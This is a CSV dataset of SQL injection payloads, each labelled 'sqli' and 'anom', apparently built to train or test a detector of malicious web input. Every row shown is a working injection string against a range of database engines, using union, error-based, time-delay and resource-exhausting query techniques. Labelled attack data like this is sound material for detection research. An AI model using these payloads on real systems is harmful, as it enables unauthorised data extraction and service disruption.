"payload","length","attack_type","label"
"1"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""dskh""=""dskh","120","sqli","anom"
"1'+(select dklk where 9862=9862 union all select null,null,null,null,null,null--","80","sqli","anom"
"1')) as fcjk where 7755=7755;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--","112","sqli","anom"
"-2782')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#","139","sqli","anom"
"1))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (((7813=7813","151","sqli","anom"
"1%' union all select null,null,null,null#","41","sqli","anom"
"1"") where 3958=3958 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","81","sqli","anom"
"-2701"")) as wvht where 5401=5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#","90","sqli","anom"
"1%""))) or 8421=(select count(*) from generate_series(1,5000000)) and (((""%""=""","77","sqli","anom"
"1))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((4744=4744","127","sqli","anom"
"1'||(select 'ojdz' where 7350=7350 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'","189","sqli","anom"
"1' where 6147=6147 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--","218","sqli","anom"
"1') and sleep(5)","16","sqli","anom"
"1%');select (case when (3773=3722) then 3773 else 3773*(select 3773 from mysql.db) end)#","88","sqli","anom"
"1'));begin user_lock.sleep(5); end and (('vcaf' like 'vcaf","58","sqli","anom"
"1"") union all select null,null,null,null#","41","sqli","anom"
"1')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('bmbt'='bmbt","123","sqli","anom"
"-4093')) union all select 5785,5785,5785#","41","sqli","anom"
"1) as tgqd where 6369=6369 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","224","sqli","anom"
"1' in boolean mode);select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","111","sqli","anom"
"1)) as berd where 5803=5803 union all select null,null,null,null,null,null,null--","81","sqli","anom"
"1%"" union all select null,null,null,null,null,null,null,null,null,null#","71","sqli","anom"
"1' in boolean mode) and (3020=3020)*6703#","41","sqli","anom"
"1,(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))","83","sqli","anom"
"-9771' or 5113=5365","19","sqli","anom"
"1' in boolean mode) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))#","175","sqli","anom"
"1"") union all select null,null,null,null,null,null,null--","57","sqli","anom"
"1) as lfra where 2669=2669 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--","120","sqli","anom"
"1"") as hsws where 6656=6656;waitfor delay '0:0:5'--","51","sqli","anom"
"-4756%')) union all select 7824,7824,7824,7824,7824,7824,7824,7824#","67","sqli","anom"
"1%')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('%'='","204","sqli","anom"
"-9881"")) or 9850=8118#","22","sqli","anom"
"-9014' order by 1--","19","sqli","anom"
"-5854))) union all select 5645#","31","sqli","anom"
"-8436') as frmf where 7225=7225 or make_set(9354=9354,7185)--","61","sqli","anom"
"1' in boolean mode) or 8156=(select count(*) from generate_series(1,5000000))--","79","sqli","anom"
"1""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""djrh""=""djrh","224","sqli","anom"
"1%"")) or 6793=(select 6793 from pg_sleep(5)) and ((""%""=""","56","sqli","anom"
"-9950' or 4425=1975","19","sqli","anom"
"1%"";select count(*) from generate_series(1,5000000) and ""%""=""","61","sqli","anom"
"1"" union all select null,null,null,null,null,null,null,null,null--","66","sqli","anom"
"-8159 where 2793=2793 union all select 2793,2793,2793,2793,2793#","64","sqli","anom"
"1) where 3076=3076 union all select null,null,null,null,null--","62","sqli","anom"
"1%"")) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((""%""=""","147","sqli","anom"
"-6733') where 4024=4024 union all select 4024,4024,4024,4024#","61","sqli","anom"
"1' and 8407=(select count(*) from generate_series(1,5000000))","61","sqli","anom"
"1""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","112","sqli","anom"
"1'));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (('bhlx' like 'bhlx","114","sqli","anom"
"1') and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","156","sqli","anom"
"-9581) as jkqo where 5200=5200 or 6872=6872--","45","sqli","anom"
"1')) as tley where 3539=3539;select (case when (3855=3855) then 3855 else 1/(select 0) end)--","93","sqli","anom"
"1"") where 7010=7010 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","118","sqli","anom"
"1"")) as wfne where 8933=8933;select (case when (3855=3855) then 3855 else 1/(select 0) end)--","93","sqli","anom"
"1"")) as fapw where 4722=4722 union all select null,null,null,null,null,null,null,null,null,null#","96","sqli","anom"
"1%"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""%""=""","119","sqli","anom"
"1';select benchmark(5000000,md5(0x4c4d6142)) and 'fgcg'='fgcg","61","sqli","anom"
"1"") where 2633=2633 union all select null,null,null,null#","57","sqli","anom"
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and 'eovg' like 'eovg","226","sqli","anom"
"1'+(select oqvo where 7448=7448 union all select null,null,null,null,null--","75","sqli","anom"
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'jiyx'='jiyx","77","sqli","anom"
"-3867%') or 3084=5633 and ('%'='","32","sqli","anom"
"1""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""tiet"" like ""tiet","132","sqli","anom"
"1 where 2823=2823 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","120","sqli","anom"
"1"" where 7796=7796;select case when 7717=7717 then 1 else null end--","68","sqli","anom"
"1 rlike sleep(5)-- muhp","23","sqli","anom"
"1')) as qaki where 5272=5272;call regexp_substring(repeat(right(char(2385),0),500000000),null)--","96","sqli","anom"
"1 where 5080=5080;select (case when (5698=3453) then 5698 else 1/(select 0) end)--","82","sqli","anom"
"-6540') where 5019=5019 or (8459=8459)*4906--","45","sqli","anom"
"1' where 9003=9003 waitfor delay '0:0:5'--","42","sqli","anom"
"-1203"")) or 8571=8571--","23","sqli","anom"
"1 where 7442=7442;begin user_lock.sleep(5); end--","49","sqli","anom"
"1%';(select * from (select(sleep(5)))acdk)#","43","sqli","anom"
"1%') union all select null,null,null,null,null--","48","sqli","anom"
"1%');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('%'='","98","sqli","anom"
"1') where 8268=8268 union all select null,null,null,null--","58","sqli","anom"
"-8023' or 6872=6872","19","sqli","anom"
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""nubc"" like ""nubc","102","sqli","anom"
"1);select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (7711=7711","76","sqli","anom"
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ""ljkg""=""ljkg","93","sqli","anom"
"1) or elt(6272=6272,sleep(5)) and (8600=8600","44","sqli","anom"
"1'||(select 'dukt' where 3206=3206 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7))||'","188","sqli","anom"
"1%') and elt(3114=3114,sleep(5))#","33","sqli","anom"
"-8093"")) as oboi where 1476=1476 union all select 1476,1476,1476,1476#","70","sqli","anom"
"1 where 9932=9932;select sleep(5)--","35","sqli","anom"
"-2751 where 6334=6334 or (9668=5845)*5845--","43","sqli","anom"
"1)) rlike (select * from (select(sleep(5)))sgvo) and ((1476=1476","64","sqli","anom"
"-3261""))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""yxms""=""yxms","224","sqli","anom"
"1"" where 4066=4066 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--","112","sqli","anom"
"1' where 8083=8083 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--","112","sqli","anom"
"-3059 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))","200","sqli","anom"
"1 where 8506=8506;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--","101","sqli","anom"
"1%"")) or 8156=(select count(*) from generate_series(1,5000000))--","65","sqli","anom"
"1') as inid where 7812=7812 or 6793=(select 6793 from pg_sleep(5))--","68","sqli","anom"
"1)) as efjb where 4642=4642 order by 1#","39","sqli","anom"
"1) union all select null,null,null,null,null--","46","sqli","anom"
"1)) as uizx where 2512=2512 and make_set(1402=2908,2908)--","58","sqli","anom"
"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--","75","sqli","anom"
"1"");waitfor delay '0:0:5' and (""dmcu""=""dmcu","43","sqli","anom"
"1%' and (2439=2555)*2555 and '%'='","34","sqli","anom"
"1%')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='","157","sqli","anom"
"1'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('subq' like 'subq","74","sqli","anom"
"1')) as ijyi where 3694=3694 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--","217","sqli","anom"
"1%')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('%'='","123","sqli","anom"
"1'+(select lqhd where 4251=4251 and (8754=5779)*5779)+'","55","sqli","anom"
"1' or 8421=(select count(*) from generate_series(1,5000000)) and 'ptou'='ptou","77","sqli","anom"
"1%"") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","99","sqli","anom"
"-4637' or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)","192","sqli","anom"
"1%"");select (case when (3168=5577) then 3168 else 3168*(select 3168 from mysql.db) end)#","88","sqli","anom"
"1');select case when 6662=9889 then 1 else null end--","53","sqli","anom"
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""sajl""=""sajl","131","sqli","anom"
"-4984%""))) union all select 6980,6980,6980,6980,6980,6980,6980,6980#","68","sqli","anom"
"1') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('sgdj' like 'sgdj","225","sqli","anom"
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""jwzy""=""jwzy","84","sqli","anom"
"1"") waitfor delay '0:0:5'--","27","sqli","anom"
"1%""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""%""=""","132","sqli","anom"
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('fzgy'='fzgy","221","sqli","anom"
"1"" where 6004=6004;select benchmark(5000000,md5(0x4c4d6142))--","62","sqli","anom"
"-8344 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))-- wjpa","207","sqli","anom"
"-5160') union all select 8067,8067,8067,8067,8067,8067,8067--","61","sqli","anom"
"-3009'+(select 'gqbo' where 6915=6915 union all select 6915,6915--","66","sqli","anom"
"1"") where 6478=6478 union all select null,null,null,null,null,null#","67","sqli","anom"
"1"") as pobe where 1704=1704;begin dbms_lock.sleep(5); end--","59","sqli","anom"
"1') where 6772=6772 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--","223","sqli","anom"
"1) or 8156=(select count(*) from generate_series(1,5000000))--","62","sqli","anom"
"1 or 8421=(select count(*) from generate_series(1,5000000))-- xgyc","66","sqli","anom"
"-8200' in boolean mode) union all select 3360,3360--","52","sqli","anom"
"1%' and make_set(8403=8403,8899) and '%'='","42","sqli","anom"
"-7824""))) union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--","73","sqli","anom"
"1%""))) rlike (select (case when (4442=4476) then 1 else 0x28 end)) and (((""%""=""","79","sqli","anom"
"1' where 4860=4860 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","170","sqli","anom"
"1')) or sleep(5) and (('zxik'='zxik","35","sqli","anom"
"1))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((3366=3366","205","sqli","anom"
"1'+(select cxvy where 7421=7421;begin user_lock.sleep(5); end)+'","64","sqli","anom"
"1' where 5335=5335;select pg_sleep(5)--","39","sqli","anom"
"1'||(select 'uedy' where 8816=8816;select case when 6558=4327 then 1 else null end--","84","sqli","anom"
"1%'));select (case when (5203=6330) then 5203 else 5203*(select 5203 from mysql.db) end)#","89","sqli","anom"
"1') and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ('mevd'='mevd","111","sqli","anom"
"-1998') as kgvf where 2346=2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--","95","sqli","anom"
"1)) as quap where 7625=7625;select (case when (4568=4241) then 4568 else cast(1 as int)/(select 0 from dual) end) from dual--","125","sqli","anom"
"1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))","105","sqli","anom"
"1%');select case when 4488=5522 then 1 else null end--","54","sqli","anom"
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('wweo'='wweo","107","sqli","anom"
"1')) as fusi where 2788=2788 or 8514=benchmark(5000000,md5(0x544d5a4c))#","72","sqli","anom"
"1)) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((3038=3038","174","sqli","anom"
"-6440))) union all select 3316,3316,3316,3316,3316,3316,3316,3316,3316,3316--","77","sqli","anom"
"1"")) as dnhd where 2657=2657 or 4240=(select 4240 from pg_sleep(5))--","69","sqli","anom"
"-6198"") or make_set(3602=2178,2178) and (""xksq"" like ""xksq","58","sqli","anom"
"1) or 6793=(select 6793 from pg_sleep(5)) and (7015=7015","56","sqli","anom"
"-8868"") where 5681=5681 union all select 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681--","92","sqli","anom"
"1"") and 8594=(select 8594 from pg_sleep(5))--","45","sqli","anom"
"-4896') union all select 1929--","31","sqli","anom"
"1"")));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--","99","sqli","anom"
